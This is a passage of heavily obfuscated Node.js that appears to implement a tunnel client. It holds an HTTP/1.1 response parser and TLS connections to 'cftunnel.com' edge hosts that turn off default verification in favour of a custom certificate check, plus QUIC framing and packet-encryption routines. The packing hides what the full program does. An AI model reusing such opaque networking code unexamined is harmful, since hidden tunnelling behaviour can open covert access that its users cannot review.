        'zgvMBgf0zvjHD1n5BMm',
        'CMvJDG',
        'DgLTzw91DevYCM9Y',
        'rLf0uNe',
        'ChvIBgLJs2v5',
        'q0fuDMy',
        'rwz3u2e',
        'u0Xgr2G',
        'CMvHC29U',
        'r2Tluxm',
        'AwyTCMfUz2u',
        'v1biq3u',
        'C2H6lMfSieH1yIdLIkVLKi3LKi3NP7dOV4FNN60',
        'q0LiCgm',
        'EMDYt1u',
        'ufrUqMm',
        'B0LhBfK',
        'zw52',
        'Axz6ugG',
        'ENbmzhi',
        'r21vCvu',
        'y29UBMvJDgLVBIbJBg9Zzwq',
        'BgrvzNG',
        'z1f1B0O',
        'rM1dwxi',
        'CKXMteS',
        'C3rVCa',
        's2XOs1i',
        'Bg9Hza',
        'g1SZm21Bv0fstL0BwZbTiezjtevFuK9pvcdLGjNPGiNNM67LVzxKUi3LRzJLNkGSiow3SUI3S+I/HZOG',
        'tMv4DxmTuhL0Ag9U',
        'Bhzuwwy',
        'A3zrt1y',
        'vfPJyNi',
        'l2jPBI9HC2G',
        'rMzmwxu',
        'ExfAAKG',
        'qKffyw8',
        'DgfNu2L6zq',
        'z0rAEwu',
        'ywfbsNO',
        'AxrYveu',
        'zgf0yq',
        'DhPjC28',
        's0PlChm',
        'q3DIqMq',
        'uMvZCg9UC2uGzw5JCNLWDgLVBIbMywLSzwq6ia',
        'x3b0B0r1CMf0Aw9U',
        'ywn0AxzHDgu',
        'Dw5IAw5K',
        'lMrVy2TLCMvUDG',
        'EevHwhu',
        'C3rYAxbuyxnRtwv0yuXPBMu',
        '5z+656ga5l+H5OgV5PwW5O2UoIa',
        'rMLSzsb0B28GBgfYz2u',
        'zNjwwhi',
        'Ag9kBLG',
        'yKn5D2C',
        'B0DRC3a',
        'Ahr0Chm6lY8',
        'quzrBMq',
        'reLVrue',
        'AhvIv3m',
        'zgvJCNLWDerHDge',
        'EujPCvm',
        'AuzqzeO',
        'AvHvug8',
        'CMv0CMfUC21PDhrLza',
        'iowkOoI9VEwKSEI0PtOG',
        'CgvLCIbJBg9ZzwqGy29Kzt0',
        's2LvD2m',
        'y3jLyxrLuhvIBgLJs2v5',
        'y2H1BMTLza',
        'runjrvnFufvcs0vz',
        'yYbOCYb0CMfMzMLJ',
        'x2jHC2vPBMzVx25LDf9JywnOzq',
        'rLz2r1y',
        'zMLU',
        'y1j3sNu',
        'y3jLyxrLrgLYzwn0B3j5',
        'yxbWBgLJyxrPB24VANnVBG',
        'l2fWAs9MAwXLl3vUEMLW',
        'yKrAvwq',
        'q0P3Bue',
        'wgLIv1q',
        'DhvUBMvSx2rVBwfPBG',
        'yKrtwNe',
        'EKPyzxy',
        'x3DHAxrxAw5KB3C',
        'zgLquLi',
        'DgXZ',
        'x3rYyw5ZBwL0',
        'sfruuc8YigzYyw1LihrVBYbSyxjNzq',
        'u2H1DhrPBMCGzg93BI4UlG',
        'zMTHDgu',
        '4P2mioE7IoERR+wFUUEHGoIUVUAwVEs4JEwpR+EuQdOG',
        's1frs3O',
        'r3LuBLq',
        'uKPcwfO',
        'EhrLCM0TmJu2y29SB3i',
        'sKTxAhy',
        'A25HBwu',
        'z1DushO',
        'r1zguLy',
        'rxPetNu',
        'DxrMoa',
        'CerVyLa',
        'Ec1MAwXLlxbHDgG',
        'Ahr0Chm6lY8YmJmUns41lJuVCMvZB2X2zq',
        'rg93BMXVywqGzw5JCNLWDgLVBIbMywLSzwq',
        'zMfSBgLUzYbIywnRihrViefYCMf5qNvMzMvYigLUC3rHBNrPyxrPB24',
        'z2v0q29UDgfPBMvYtwvTB3j5',
        'Ce5kALC',
        'Ec1MAwXLlxnPEMu',
        'yKTeCK4',
        'sNHls2K',
        'x2nVBM5Ly3rfzgDL',
        'A1nwEg4',
        'zhPhBNm',
        'ANz2uNy',
        'vgnQCg4',
        'Bg9VCgjHy2SGCMvXDwvZDcb0Aw1LB3v0',
        'DgzbChO',
        'AwDUB3jL',
        'quncA0m',
        'DeXXrKq',
        'icaGmI4G5OIw5Bcg5A+g6zkL5PAh5lU25Ps+5ywLic4VA2v5CY8G55UU5B2vicJOV5dOOyWGz2vUzxjHDgvFA2v5CY5WEsdNLj/MIjaP',
        'zMv0y2Hjua',
        'r3jJyMm',
        'C0vnz1C',
        'EwHACNK',
        'wwTwrxy',
        'AxnbCNjHEq',
        'ChjVEhLszxf1zxn0',
        'igHHCYbHBIb1BNjLywrHyMXLienVBM5Ly3rszxf1zxn0oIa',
        'CMvHzfvjBNqXnKXf',
        'Au9oruS',
        'qK9fz1i',
        'BMv0D29YA0LUDgvYzMfJzxm',
        'CwX4B1q',
        'A0TtAxK',
        'wMXrqMG',
        'y29UBMvJDgvKihrVia',
        'BNHxBuy',
        'zML4zwq',
        '4P2mioMfJEE9RUAGOEMQJowKSEI0PsaO6z2ErevcvuFMQkhLVi/LV4xPOBVPHy3NVA7LR4BPKQuPoG',
        'CM1tEw5J',
        'y0TerxK',
        'ue9zzLi',
        'y2XLyw51Ca',
        'AfHLwM4',
        't3jWC1O',
        'sersqNu',
        'EwH1Ce8',
        'zg96AMq',
        'y3jLyxrLq2LWAgvYAxy',
        'BgfZDevYCM9Y',
        'wwjQwuK',
        'AvzyD1u',
        'EeLkzg4',
        'CeL5CKG',
        'C2vJlxDLyNnVy2TLDc0',
        'BNfTuMy',
        'C3vI',
        'y2LAswO',
        'y3jLyxrL',
        'BgLTAxq',
        'wKrTqMK',
        'u3fgDha',
        'AxjAEwu',
        'Aw5PDgLHBe1HEfn0CMvHBxncAwrP',
        'CMHrzK4',
        'AxvhrgC',
        'txD2Ce0',
        't0fPz0K',
        'Ec1VCMLNAw5HBc1WyxrO',
        'CgvLCIbPzgXLigzVCIa',
        'yxbWBgLJyxrPB24Vzg5ZlwPZB24',
        'wfLPz0G',
        'C2vYDMvYsgvSBg9dB21WBgv0zq',
        'q0Xpu0ve',
        'Dhj1zq',
        'x2fJA0r1zq',
        'reXAvxq',
        'ios6JoI/M+wiTUwmHsaOBNbTigvUz2LUzxmG6zEO5QEB6z2z6BUy6lEZ6l+hksWG6Ake5Qoa6iEQ5Osi6kgL6kof',
        'wNPjzeG',
        'u0zWzhC',
        'ugTYEvG',
        'v1n5ALq',
        'u0foigrVzxmGBM90ignVDMvYigGYlMnMDhvUBMvSlMnVBq',
        't1v5wg0',
        'D3nfBgG',
        'zKPPCfm',
        'D3jPDgvvsw50mtzmrq',
        'BeTkzK0',
        'sgLdzxC',
        'Dg9Rzw4',
        'q2XVDwrgBgfYzsbpCMLNAw4Gu1nm',
        'uMXIz1a'
    ];
    a0a = function () {
        return oQ;
    };
    return a0a();
}
function a0bE(a) {
    const iZ = a0d9, b = {
            'KQOyh': iZ(0xe83),
            'mpuWp': iZ(0xfcc),
            'FfLYu': 'end',
            'hmSWJ': iZ(0x76b),
            'XIcHB': iZ(0xcba),
            'QNXAf': function (c, d) {
                return c < d;
            },
            'ncnYp': function (c) {
                return c();
            },
            'mdFUQ': function (c, d, f) {
                return c(d, f);
            },
            'hoJnX': function (c, d) {
                return c(d);
            },
            'ruTAw': 'malformed\x20HTTP/1.1\x20response\x20status',
            'ugQdH': function (c, d) {
                return c > d;
            },
            'sXgIc': function (c) {
                return c();
            },
            'UNtFH': function (c) {
                return c();
            }
        };
    return new Promise((c, d) => {
        const j0 = iZ, f = {
                'erFTy': b[j0(0x78c)],
                'xvmJu': b['mpuWp'],
                'VyhTV': b['FfLYu'],
                'jVKnJ': b[j0(0x310)],
                'sQflH': b[j0(0x6aa)],
                'FSUaj': function (l, m) {
                    const j1 = j0;
                    return b[j1(0xf6a)](l, m);
                },
                'RZRaC': function (l) {
                    return b['ncnYp'](l);
                },
                'AZopy': 'latin1',
                'WsvHW': function (l, m, n) {
                    const j2 = j0;
                    return b[j2(0x45e)](l, m, n);
                },
                'FfdYh': function (l, m) {
                    const j3 = j0;
                    return b[j3(0xe91)](l, m);
                },
                'bjMnU': b['ruTAw'],
                'BPMot': function (l, m) {
                    return b['ugQdH'](l, m);
                },
                'CrUfO': function (l, m) {
                    return l + m;
                },
                'SZENx': function (l, m) {
                    const j4 = j0;
                    return b[j4(0xe91)](l, m);
                },
                'JuDPz': function (l) {
                    const j5 = j0;
                    return b[j5(0x6ad)](l);
                },
                'RaWGF': function (l) {
                    const j6 = j0;
                    return b[j6(0x602)](l);
                },
                'VxECz': j0(0xcf9)
            };
        let g = Buffer[j0(0x901)](0x0);
        const h = () => {
                const j7 = j0;
                a['removeListener'](f['erFTy'], i), a[j7(0xca0)](f['xvmJu'], j), a[j7(0xca0)](f['VyhTV'], k), a['removeListener'](f['jVKnJ'], k);
            }, i = l => {
                const j8 = j0;
                g = g[j8(0xc54)] ? Buffer[j8(0x83f)]([
                    g,
                    l
                ]) : l;
                const m = g[j8(0xe0a)](f[j8(0x2d9)]);
                if (f[j8(0x70a)](m, 0x0))
                    return;
                f[j8(0xe31)](h);
                const n = g['subarray'](0x0, m)[j8(0x43a)](f[j8(0x588)]), o = n[j8(0xa6a)]('\x0d\x0a'), p = o[0x0]['split']('\x20'), q = f[j8(0x89e)](parseInt, p[0x1], 0xa);
                if (!Number[j8(0x63f)](q)) {
                    f[j8(0x8bc)](d, new Error(f[j8(0x1af)]));
                    return;
                }
                const r = [];
                for (let s = 0x1; s < o[j8(0xc54)]; s++) {
                    const t = o[s];
                    if (!t)
                        continue;
                    const u = t[j8(0xe0a)](':');
                    f['BPMot'](u, 0x0) && r[j8(0xb66)]([
                        t['slice'](0x0, u)[j8(0x5b0)](),
                        t[j8(0x47b)](f[j8(0xa93)](u, 0x1))[j8(0x5b0)]()
                    ]);
                }
                f[j8(0x7ea)](c, {
                    'status': q,
                    'headers': r,
                    'rest': g[j8(0xad0)](f[j8(0xa93)](m, 0x4))
                });
            }, j = l => {
                const j9 = j0;
                f[j9(0x1030)](h), f[j9(0x7ea)](d, l);
            }, k = () => {
                const ja = j0;
                f[ja(0xdd9)](h), d(new Error(f[ja(0x9ec)]));
            };
        a['on'](j0(0xe83), i), a['on'](b['mpuWp'], j), a['on'](b[j0(0xe7c)], k), a['on'](b[j0(0x310)], k);
    });
}
function a0bF(a) {
    const jb = a0d9, b = {
            'AZqiN': jb(0xff4),
            'ZrmJo': jb(0x55f),
            'MsNUW': function (f, g) {
                return f === g;
            },
            'TyoJk': 'cftunnel.com',
            'HHiYz': jb(0xceb),
            'uKTRr': function (f, g) {
                return f !== g;
            },
            'BNCwI': jb(0x6e4),
            'REABI': function (f, g) {
                return f + g;
            },
            'ZImgF': jb(0x6b7),
            'vLjZg': function (f, g) {
                return f(g);
            },
            'XiQJD': 'issuer\x20OU\x20mismatch:\x20',
            'EbcZr': function (f, g) {
                return f !== g;
            },
            'DLZUt': jb(0x82b),
            'ViQDK': jb(0x795),
            'KwWNG': function (f, g) {
                return f(g);
            },
            'OyAcd': jb(0xf16)
        };
    if (!a || !a['issuer'])
        return b[jb(0xa5b)];
    if (b[jb(0x4d7)](a[jb(0x38b)]['O'], b['BNCwI']))
        return b['REABI'](b[jb(0x186)], a[jb(0x38b)]['O'] || '');
    if (!b[jb(0xb39)](String, a[jb(0x38b)]['OU'] || '')[jb(0x1ba)](jb(0xf1e)))
        return b['REABI'](b[jb(0x429)], a[jb(0x38b)]['OU'] || '');
    if (!a[jb(0x507)] || b[jb(0xe29)](a['subject']['CN'], b[jb(0xf10)]))
        return b[jb(0x479)];
    const c = b['KwWNG'](String, a['subjectaltname'] || '')['split'](',')[jb(0xf2e)](f => f[jb(0x5b0)]()['toLowerCase']()), d = c[jb(0x286)](f => {
            const jc = jb;
            if (!f['startsWith'](b[jc(0xce2)]))
                return ![];
            const g = f['slice'](0x4);
            return g === b[jc(0xf21)] || b[jc(0x30b)](g, b[jc(0xa8f)]) || g[jc(0x1ba)]('*.') && b['ZrmJo'][jc(0x102a)](g['slice'](0x1));
        });
    if (!d)
        return b[jb(0x766)];
    return null;
}
function a0bG(a, b) {
    const jd = a0d9, c = {
            'JMwFy': jd(0x55f),
            'QQCjb': 'error',
            'SqFtp': jd(0x343),
            'zcNDO': function (h, i) {
                return h(i);
            },
            'yexcg': function (h, i) {
                return h + i;
            },
            'YNXIX': function (h, i) {
                return h + i;
            },
            'xJJqs': jd(0x5d5),
            'LPCNu': function (h, i) {
                return h + i;
            },
            'frVXr': jd(0x870),
            'PmKmE': function (h) {
                return h();
            }
        }, d = a0aZ['slice']()[jd(0xcd4)](() => Math[jd(0x890)]() - 0.5);
    let f = null;
    const g = async () => {
        const jh = jd, h = {
                'GqcZw': function (i, j) {
                    const je = a0b;
                    return c[je(0x338)](i, j);
                },
                'rZhAM': function (i, j) {
                    return c['yexcg'](i, j);
                },
                'lZVcZ': 'edge\x20did\x20not\x20negotiate\x20h2',
                'oeNQn': function (i, j) {
                    return i + j;
                },
                'rJhKS': 'connected\x20to\x20'
            };
        for (const i of d) {
            try {
                return await new Promise((j, k) => {
                    const jf = a0b, l = a0j[jf(0xa20)]({
                            'host': i,
                            'port': a0b0,
                            'ALPNProtocols': ['h2'],
                            'servername': c[jf(0x349)],
                            'rejectUnauthorized': ![]
                        });
                    l[jf(0x9f2)](0x2710, () => l[jf(0x28a)](new Error(jf(0x43f)))), l['on'](c[jf(0x773)], k), l['on'](c[jf(0xf01)], () => {
                        const jg = jf;
                        if (a) {
                            const n = h[jg(0x1d4)](a0bF, l['getPeerCertificate'](![]));
                            if (n) {
                                l[jg(0x28a)](new Error(h[jg(0x80a)](jg(0xd63), n)));
                                return;
                            }
                        }
                        const m = l[jg(0x2b3)];
                        if (m && m !== 'h2') {
                            l[jg(0x28a)](new Error(h[jg(0xf4a)]));
                            return;
                        }
                        a0cM > 0x0 ? l[jg(0x9f2)](a0cM, () => l[jg(0x28a)](new Error(jg(0x7e1)))) : l['setTimeout'](0x0), b['info'](h[jg(0x80a)](h['oeNQn'](h['rJhKS'] + i, ':'), a0b0)), h[jg(0x1d4)](j, l);
                    });
                });
            } catch (j) {
                f = j, b[jh(0xfdf)](c['yexcg'](c[jh(0x2aa)](c[jh(0x386)](c[jh(0x185)], i), jh(0xba3)), j));
            }
        }
        throw new Error(c[jh(0x353)](c[jh(0xe90)], f));
    };
    return c[jd(0x2a4)](g);
}
const a0bH = Buffer[a0d9(0xca5)](a0d9(0xb9b), a0d9(0x1a2)), a0bI = Buffer['from']('52bb825cdb65', a0d9(0x1a2)), a0bJ = Buffer[a0d9(0x83f)]([
        a0bH,
        Buffer[a0d9(0xca5)]('01', a0d9(0xc2b))
    ]), a0bK = Buffer[a0d9(0x83f)]([
        a0bI,
        Buffer['from']('01', a0d9(0xc2b))
    ]), a0bL = {
        'http': 0x0,
        'websocket': 0x1,
        'tcp': 0x2
    }, a0bM = a0d9(0x95e), a0bN = a0d9(0xb10), a0bO = a0d9(0x1d3), a0bP = 'HttpHeader', a0bQ = 0x1, a0bR = a0d9(0x820), a0bS = 'quic.cftunnel.com', a0bT = Buffer[a0d9(0xca5)](a0d9(0x51d), a0d9(0x1a2)), a0bU = Buffer[a0d9(0xca5)](a0d9(0x862), a0d9(0x1a2)), a0bV = 0x10, a0bW = 0x4, a0bX = 0x4d0, a0bY = 0x4b0, a0bZ = 0x0, a0c0 = 0x1, a0c1 = 0x2, a0c2 = [
        a0d9(0xcd0),
        a0d9(0xc7d),
        'one-rtt'
    ], a0c3 = {
        'padding': 0x0,
        'ping': 0x1,
        'ack': 0x2,
        'ackEcn': 0x3,
        'resetStream': 0x4,
        'stopSending': 0x5,
        'crypto': 0x6,
        'newToken': 0x7,
        'stream': 0x8,
        'maxData': 0x10,
        'maxStreamData': 0x11,
        'maxStreamsBidi': 0x12,
        'maxStreamsUni': 0x13,
        'newConnectionId': 0x18,
        'retireConnectionId': 0x19,
        'pathChallenge': 0x1a,
        'pathResponse': 0x1b,
        'transportClose': 0x1c,
        'applicationClose': 0x1d,
        'handshakeDone': 0x1e,
        'datagram': 0x30,
        'datagramLen': 0x31
    }, a0c4 = {
        'originalDestinationConnectionId': 0x0,
        'maxIdleTimeout': 0x1,
        'statelessResetToken': 0x2,
        'maxUdpPayloadSize': 0x3,
        'initialMaxData': 0x4,
        'initialMaxStreamDataBidiLocal': 0x5,
        'initialMaxStreamDataBidiRemote': 0x6,
        'initialMaxStreamDataUni': 0x7,
        'initialMaxStreamsBidi': 0x8,
        'initialMaxStreamsUni': 0x9,
        'ackDelayExponent': 0xa,
        'maxAckDelay': 0xb,
        'disableActiveMigration': 0xc,
        'activeConnectionIdLimit': 0xe,
        'initialSourceConnectionId': 0xf,
        'retrySourceConnectionId': 0x10,
        'maxDatagramFrameSize': 0x20
    };
function a0c5(a) {
    const ji = a0d9, b = {
            'qfczD': function (d, f) {
                return d(f);
            },
            'IYlxE': function (d, f) {
                return d < f;
            },
            'cExuS': function (d, f) {
                return d < f;
            }
        }, c = b['qfczD'](BigInt, a);
    if (b[ji(0x3ed)](c, 0x40n))
        return 0x1;
    if (b[ji(0x9b0)](c, 0x4000n))
        return 0x2;
    if (b['cExuS'](c, 0x40000000n))
        return 0x4;
    return 0x8;
}
function a0c6(a) {
    const jj = a0d9, b = {
            'DwsmZ': function (j, k) {
                return j(k);
            },
            'LtWKK': function (j, k) {
                return j < k;
            },
            'ZGbtr': function (j, k) {
                return j > k;
            },
            'ZWlgN': function (j, k) {
                return j & k;
            },
            'nmCTn': function (j, k) {
                return j(k);
            }
        }, c = b[jj(0xb92)](BigInt, a);
    let d, f, g;
    if (b[jj(0xb6d)](c, 0x40n))
        f = 0x1, g = 0x0;
    else {
        if (b[jj(0xb6d)](c, 0x4000n))
            f = 0x2, g = 0x40;
        else
            b['LtWKK'](c, 0x40000000n) ? (f = 0x4, g = 0x80) : (f = 0x8, g = 0xc0);
    }
    d = Buffer[jj(0x901)](f);
    let h = c;
    for (let j = f - 0x1; b['ZGbtr'](j, 0x0); j--) {
        d[j] = Number(b[jj(0x7ff)](h, 0xffn)), h >>= 0x8n;
    }
    return d[0x0] = b[jj(0x1ea)](Number, h) | g, d;
}
function a0c7(a, b) {
    const jk = a0d9, c = {
            'jgzXD': function (h, j) {
                return h << j;
            },
            'rDyaE': function (h, j) {
                return h >> j;
            },
            'yhZry': function (h, j) {
                return h < j;
            },
            'tByKR': function (h, j) {
                return h - j;
            },
            'ivgCo': function (h, j) {
                return h(j);
            },
            'IlIyB': function (h, j) {
                return h & j;
            },
            'SFJra': function (h, j) {
                return h < j;
            },
            'WTbgJ': function (h, j) {
                return h | j;
            },
            'IOQDw': function (h, j) {
                return h(j);
            },
            'HbwCY': function (h, j) {
                return h + j;
            }
        };
    if (a[jk(0xc54)] - b < 0x1)
        return null;
    const d = a[b], f = c[jk(0xb8e)](0x1, c[jk(0xfe3)](d, 0x6));
    if (c[jk(0xedb)](c[jk(0x3e4)](a[jk(0xc54)], b), f))
        return null;
    let g = c[jk(0x853)](BigInt, c[jk(0x756)](d, 0x3f));
    for (let h = 0x1; c[jk(0xace)](h, f); h++) {
        g = c[jk(0xbb0)](c[jk(0xb8e)](g, 0x8n), c['IOQDw'](BigInt, a[c[jk(0x1c7)](b, h)]));
    }
    return [
        g,
        f
    ];
}
class a0c8 {
    constructor() {
        const jl = a0d9;
        this[jl(0xd8f)] = [];
    }
    [a0d9(0x73b)](a) {
        const jm = a0d9, b = {
                'ILitr': function (c, d) {
                    return c & d;
                }
            };
        return this[jm(0xd8f)][jm(0xb66)](Buffer[jm(0xca5)]([b[jm(0x841)](a, 0xff)])), this;
    }
    ['bytes'](a) {
        const jn = a0d9;
        return this[jn(0xd8f)]['push'](Buffer[jn(0x24f)](a) ? a : Buffer['from'](a)), this;
    }
    [a0d9(0xee9)](a, b) {
        const jo = a0d9, c = {
                'CtAuV': function (f, g) {
                    return f - g;
                },
                'IdAzg': function (f, g) {
                    return f >= g;
                },
                'uzfBA': function (f, g) {
                    return f & g;
                }
            }, d = Buffer[jo(0x901)](b);
        for (let f = c['CtAuV'](b, 0x1); c[jo(0x731)](f, 0x0); f--) {
            d[f] = Number(c[jo(0xdd4)](a, 0xffn)), a >>= 0x8n;
        }
        return this[jo(0xd8f)][jo(0xb66)](d), this;
    }
    ['u8'](a) {
        const jp = a0d9, b = {
                'jwWIv': function (c, d) {
                    return c & d;
                }
            };
        return this[jp(0xd8f)]['push'](Buffer[jp(0xca5)]([b['jwWIv'](a, 0xff)])), this;
    }
    [a0d9(0x38c)](a) {
        const jq = a0d9, b = Buffer[jq(0x901)](0x2);
        return b[jq(0x589)](a & 0xffff, 0x0), this[jq(0xd8f)][jq(0xb66)](b), this;
    }
    [a0d9(0xb74)](a) {
        const jr = a0d9, b = {
                'pWlSc': function (d, f) {
                    return d >>> f;
                }
            }, c = Buffer[jr(0x901)](0x4);
        return c[jr(0xb3f)](b[jr(0xf45)](a, 0x0), 0x0), this['parts'][jr(0xb66)](c), this;
    }
    [a0d9(0x18d)](a) {
        const js = a0d9, b = {
                'YcPBU': function (c, d) {
                    return c(d);
                }
            };
        return this[js(0xd8f)]['push'](b[js(0xaac)](a0c6, a)), this;
    }
    [a0d9(0x96c)]() {
        const jt = a0d9;
        return Buffer[jt(0x83f)](this['parts']);
    }
}
class a0c9 {
    constructor(a) {
        const ju = a0d9;
        this[ju(0x82f)] = a, this['pos'] = 0x0;
    }
    get [a0d9(0x190)]() {
        const jv = a0d9, a = {
                'VXdKh': function (b, c) {
                    return b - c;
                }
            };
        return a['VXdKh'](this[jv(0x82f)][jv(0xc54)], this['pos']);
    }
    ['byte']() {
        const jw = a0d9, a = this['buffer'][this[jw(0x157)]];
        return this[jw(0x157)] += 0x1, a;
    }
    [a0d9(0x38c)]() {
        const jx = a0d9, a = this[jx(0x82f)][jx(0xc6f)](this['pos']);
        return this[jx(0x157)] += 0x2, a;
    }
    [a0d9(0xc83)]() {
        const jy = a0d9, a = this[jy(0x82f)][jy(0x4bc)](this[jy(0x157)], 0x3);
        return this['pos'] += 0x3, a;
    }
    [a0d9(0xb74)]() {
        const jz = a0d9, a = this[jz(0x82f)][jz(0x53d)](this[jz(0x157)]);
        return this[jz(0x157)] += 0x4, a;
    }
    [a0d9(0xbce)](a) {
        const jA = a0d9, b = {
                'cydQQ': function (d, f) {
                    return d + f;
                }
            }, c = this[jA(0x82f)][jA(0xad0)](this['pos'], b[jA(0x3ab)](this[jA(0x157)], a));
        return this[jA(0x157)] += a, c;
    }
    ['varint']() {
        const jB = a0d9, a = {
                'NJfwQ': function (c, d) {
                    return c === d;
                },
                'cJnss': 'truncated\x20QUIC\x20varint'
            }, b = a0c7(this[jB(0x82f)], this[jB(0x157)]);
        if (a['NJfwQ'](b, null))
            throw new Error(a[jB(0xfd4)]);
        return this[jB(0x157)] += b[0x1], b[0x0];
    }
    ['number']() {
        const jC = a0d9, a = {
                'Zoyeb': function (c, d) {
                    return c(d);
                }
            }, b = this[jC(0x18d)]();
        if (b > BigInt(Number['MAX_SAFE_INTEGER']))
            return Number[jC(0x7b9)];
        return a[jC(0x7b4)](Number, b);
    }
}
function a0ca(a, b, c) {
    const jD = a0d9;
    return a0k[jD(0x16e)](a, b)[jD(0x19c)](c)[jD(0x61c)]();
}
function a0cb(a, b, c, d) {
    const jE = a0d9, f = {
            'xYUeo': function (j, k) {
                return j < k;
            }
        }, g = [];
    let h = Buffer['alloc'](0x0), i = 0x1;
    while (f[jE(0x22f)](g[jE(0xdfa)]((j, k) => j + k[jE(0xc54)], 0x0), d)) {
        h = a0k[jE(0x16e)](a, b)['update'](Buffer[jE(0x83f)]([
            h,
            c,
            Buffer[jE(0xca5)]([i])
        ]))[jE(0x61c)](), g[jE(0xb66)](h), i++;
    }
    return Buffer[jE(0x83f)](g)[jE(0xad0)](0x0, d);
}
function a0cc(a, b, c, d, f) {
    const jF = a0d9, g = {
            'QcEXo': jF(0xec2),
            'DuRHK': function (k, l) {
                return k & l;
            },
            'KhYAC': function (k, l) {
                return k & l;
            },
            'IYvfk': function (k, l, m, n, o) {
                return k(l, m, n, o);
            }
        }, h = Buffer[jF(0x83f)]([
            Buffer[jF(0xca5)]('tls13\x20', g[jF(0xb88)]),
            Buffer[jF(0xca5)](c, g['QcEXo'])
        ]), i = d || Buffer['alloc'](0x0), j = Buffer[jF(0x83f)]([
            Buffer[jF(0xca5)]([
                g[jF(0xb98)](f >> 0x8, 0xff),
                g['KhYAC'](f, 0xff)
            ]),
            Buffer[jF(0xca5)]([h[jF(0xc54)]]),
            h,
            Buffer['from']([i[jF(0xc54)]]),
            i
        ]);
    return g[jF(0x578)](a0cb, a, b, j, f);
}
class a0cd {
    constructor(a, b, c) {
        const jG = a0d9, d = {
                'LXfJr': function (g, h) {
                    return g === h;
                },
                'qlxoT': function (g, h, i, j, k, l) {
                    return g(h, i, j, k, l);
                },
                'mVmCt': jG(0x81b),
                'WcZDu': function (g, h, i, j, k, l) {
                    return g(h, i, j, k, l);
                },
                'TecPQ': 'quic\x20iv',
                'Hyfxg': jG(0x492),
                'DktLp': jG(0xc42)
            };
        this[jG(0xbc4)] = a, this[jG(0x982)] = b, this[jG(0xf41)] = c;
        const f = d['LXfJr'](b, jG(0x5a6)) ? 0x20 : 0x10;
        this[jG(0x525)] = d[jG(0xee4)](a0cc, a, c, d['mVmCt'], Buffer['alloc'](0x0), f), this['iv'] = d[jG(0xa48)](a0cc, a, c, d[jG(0x90a)], Buffer['alloc'](0x0), 0xc), this[jG(0x77f)] = d['qlxoT'](a0cc, a, c, d[jG(0x583)], Buffer[jG(0x901)](0x0), f), this[jG(0xaef)] = d[jG(0x2ee)](f, 0x20) ? 'aes-256-ecb' : d[jG(0x725)], this[jG(0xe7f)] = 0x10;
    }
    [a0d9(0x398)](a) {
        const jH = a0d9, b = {
                'SAnJy': function (f, g) {
                    return f(g);
                },
                'pfAhn': function (f, g) {
                    return f < g;
                },
                'klsZx': function (f, g) {
                    return f - g;
                },
                'MqDLE': function (f, g) {
                    return f & g;
                }
            }, c = Buffer[jH(0xca5)](this['iv']);
        let d = b['SAnJy'](BigInt, a);
        for (let f = 0x0; b[jH(0x97c)](f, 0x8); f++) {
            c[b['klsZx'](0xb, f)] ^= b['SAnJy'](Number, b[jH(0xff7)](d, 0xffn)), d >>= 0x8n;
        }
        return c;
    }
    [a0d9(0x62b)](a) {
        const jI = a0d9, b = a0k[jI(0xef4)](this['hpCipher'], this[jI(0x77f)], null);
        return b[jI(0xa4f)](![]), Buffer[jI(0x83f)]([
            b[jI(0x19c)](a),
            b[jI(0xb87)]()
        ])[jI(0xad0)](0x0, 0x5);
    }
    [a0d9(0x3fd)](a, b, c) {
        const jJ = a0d9, d = a0k[jJ(0xef4)](this[jJ(0x982)], this['key'], this['nonce'](a));
        d[jJ(0x56b)](b);
        const f = Buffer[jJ(0x83f)]([
                d[jJ(0x19c)](c),
                d[jJ(0xb87)]()
            ]), g = d[jJ(0x1027)]();
        return Buffer[jJ(0x83f)]([
            f,
            g
        ]);
    }
    [a0d9(0x7c9)](a, b, c) {
        const jK = a0d9, d = {
                'rAcVr': function (g, h) {
                    return g - h;
                },
                'NtxHi': function (g, h) {
                    return g - h;
                }
            }, f = a0k['createDecipheriv'](this[jK(0x982)], this[jK(0x525)], this[jK(0x398)](a));
        return f[jK(0x56b)](b), f[jK(0x76e)](c[jK(0xad0)](d[jK(0x598)](c[jK(0xc54)], this[jK(0xe7f)]))), Buffer['concat']([
            f[jK(0x19c)](c[jK(0xad0)](0x0, d[jK(0x5ae)](c[jK(0xc54)], this[jK(0xe7f)]))),
            f[jK(0xb87)]()
        ]);
    }
}
function a0ce(a, b) {
    const jL = a0d9, c = {
            'oYezD': function (f, g, h, i, j, k) {
                return f(g, h, i, j, k);
            },
            'Pscrc': jL(0x3b0)
        }, d = new a0cd(a[jL(0xbc4)], a[jL(0x982)], c[jL(0x44e)](a0cc, a[jL(0xbc4)], a[jL(0xf41)], c[jL(0x7ac)], Buffer[jL(0x901)](0x0), a[jL(0xf41)][jL(0xc54)]));
    return b && (d[jL(0x77f)] = a[jL(0x77f)]), d;
}
function a0cf(a, b) {
    const jM = a0d9, c = {
            'piqNP': jM(0xac8),
            'XIvjk': function (i, j, k, l) {
                return i(j, k, l);
            },
            'rjaXR': jM(0x835),
            'Uqxua': jM(0x4cf),
            'vjAET': jM(0x334)
        }, d = c['piqNP'], f = c[jM(0x6a7)](a0ca, d, a0bT, a), g = b ? c[jM(0x4db)] : c[jM(0xcf6)], h = b ? 'server\x20in' : c[jM(0x4db)];
    return {
        'send': new a0cd(d, jM(0x334), a0cc(d, f, g, Buffer[jM(0x901)](0x0), 0x20)),
        'recv': new a0cd(d, c[jM(0xd72)], a0cc(d, f, h, Buffer[jM(0x901)](0x0), 0x20))
    };
}
function a0cg(a, b, c) {
    const jN = a0d9, d = {
            'mZuZc': function (g, h) {
                return g + h;
            },
            'HdpZn': function (g, h) {
                return g <= h;
            },
            'rtSyY': function (g, h) {
                return g < h;
            }
        }, f = [];
    for (const g of a) {
        const h = g[jN(0x373)], i = d[jN(0x4bf)](g[jN(0x373)], g['length']);
        if (d[jN(0x17e)](i, b) || h >= c) {
            f[jN(0xb66)](g);
            continue;
        }
        d[jN(0x53b)](h, b) && f['push']({
            'start': h,
            'length': b - h
        }), i > c && f['push']({
            'start': c,
            'length': i - c
        });
    }
    return f;
}
function a0ch(c, d) {
    const jO = a0d9, f = {
            'bbsfs': function (i, j) {
                return i + j;
            },
            'dwVly': function (i, j) {
                return i <= j;
            },
            'ZdnQv': function (i, j) {
                return i + j;
            },
            'jsFiX': function (i, j) {
                return i - j;
            }
        }, g = c['concat'](d)[jO(0xcd4)]((i, j) => i['start'] - j[jO(0x373)]), h = [];
    for (const i of g) {
